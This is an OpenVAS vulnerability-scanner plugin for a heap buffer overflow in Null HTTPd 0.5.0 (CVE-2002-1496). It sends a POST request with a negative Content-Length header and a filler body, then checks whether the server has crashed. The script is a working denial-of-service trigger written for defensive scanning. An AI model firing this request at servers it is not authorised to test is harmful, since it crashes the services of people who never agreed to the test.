##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_null_httpd_server_content_length_bof_vuln.nasl 11857 2018-10-12 08:25:16Z cfischer $
#
# Null HTTPd Server Content-Length HTTP Header Buffer overflow Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802923");
  script_version("$Revision: 11857 $");
  script_cve_id("CVE-2002-1496");
  script_bugtraq_id(5774);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 10:25:16 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-07-27 11:36:16 +0530 (Fri, 27 Jul 2012)");
  script_name("Null HTTPd Server Content-Length HTTP Header Buffer overflow Vulnerability");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/10160");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2002-09/0284.html");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Null_httpd/banner");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary code on
  the target system or cause the web server to crash.");
  script_tag(name:"affected", value:"Null HTTPd Server version 0.5.0 or prior");
  script_tag(name:"insight", value:"Improper way of handling of negative 'Content-Length' values in HTTP header
  field, leads to a buffer overflow. By sending an HTTP request with a negative
  value in the 'Content-Length' header field, a remote attacker could overflow
  a buffer and cause the server to crash or execute arbitrary code on the
  system.");
  script_tag(name:"solution", value:"Upgrade Null HTTPd Server to 0.5.1 or later.");
  script_tag(name:"summary", value:"This host is running Null HTTPd Server and is prone to heap based
  buffer overflow vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"exploit");

  script_xref(name:"URL", value:"http://freecode.com/projects/nullhttpd");
  exit(0);
}


include("http_func.inc");


port = get_http_port(default:80);

banner = get_http_banner(port:port);
if(!banner || "Server: Null httpd" >!< banner){
  exit(0);
}

host = http_host_name(port:port);

Postdata = crap(500);
sndReq = string("POST / HTTP/1.1\r\n",
                "Host: ", host,"\r\n",
                "Content-Length: -1000\r\n\r\n", Postdata);
rcvRes = http_send_recv(port:port, data:sndReq);

if(http_is_dead(port:port)){
  security_message(port:port);
  exit(0);
}

exit(99);
